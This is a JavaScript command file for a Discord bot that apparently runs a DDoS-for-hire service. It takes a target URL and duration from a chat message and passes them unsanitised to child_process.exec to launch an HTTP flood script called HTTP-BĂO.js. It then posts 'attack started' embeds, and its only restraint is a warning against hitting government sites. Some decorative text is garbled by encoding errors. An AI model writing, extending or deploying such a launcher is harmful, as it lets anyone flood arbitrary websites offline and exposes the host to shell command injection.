const Discord = require("discord.js");

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const duration = message.content.split (" ")[2]
const ayarlar = require('../ayarlar.json');
var room = ayarlar.commandroom;

if (message.channel.id != room) {
	return;
  }

// Example command
if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('WARRING')
	.setDescription("`Ex ;HTTP-BĂO https://sex.com 64 60`")
	.setFooter("Please do not attack government website!")
	message.channel.send(embed1);
	return;
	}

// Command attack
var exec = require('child_process').exec
exec(`node HTTP-BĂO.js ${host} 64 ${duration}`, (error, stdout, stderr) => {
});

// Start Attacking
setTimeout(function(){ 
    console.log('Start Attacking ID Discord:' +  message.guild.id)

const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('đ **PANDA** đ')
	.setTimestamp()
  .setDescription("**đđľđŞđˇ**: `VIP đ` \n **đđđŤđ đđ­** : `" + host + "` \n **đđđ­đĄđ¨đđŹ** : `đđđđ-đđĚđđ°` \n **đđđđ** : `" + duration + "`")
	.setFooter('ÂŠ Developer: hoandeptraiv2#8467', client.user.avatarURL)
	.setTimestamp()
	.setImage(attackgif)
	.setThumbnail("")
 message.channel.send(embed);
 }, 5000); //time in milliseconds 1000 milliseconds = 1 seconds

// Attack Gif
var gifler = ["https://j.gifs.com/2kRnmP.gif", "https://media1.nguoiduatin.vn/thumb_x640x384/media/truong-cong-hieu/2019/06/15/bom-tsar-bomba.gif"];
    var attackgif = gifler[Math.floor((Math.random() * gifler.length))];

// Verify Gif
var gify = ["https://cdn.weasyl.com/static/media/d5/a0/8f/d5a08f3f771a8c3efa3749cdfab5bda6853ba9f22dc5fe70f053595b6f480468.gif"];
		var loadinggif = gify[Math.floor((Math.random() * gify.length))];

// Start Verify
console.log('Start Verify ID Discord:' +  message.guild.id)
const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('đ **PANDA** đ')
	.setTimestamp()
	.setDescription("**âş đđđ˘đ­ đđ¨đŤ đ­đĄđ đđ¨đ¨đĽđđ¨đ°đ§ ~~ **")
	.setFooter('ÂŠ Developer: hoandeptraiv2#8467', client.user.avatarURL)
	.setTimestamp()
	.setImage(loadinggif)
	.setThumbnail("")
 message.channel.send(embed);
  }


exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['HTTP-BĂO'],
  permLevel: 0
}

exports.help = {
  name: 'HTTP-BĂO',
  description: 'Rabbitx',
  usage: 'HTTP-BĂO'
}
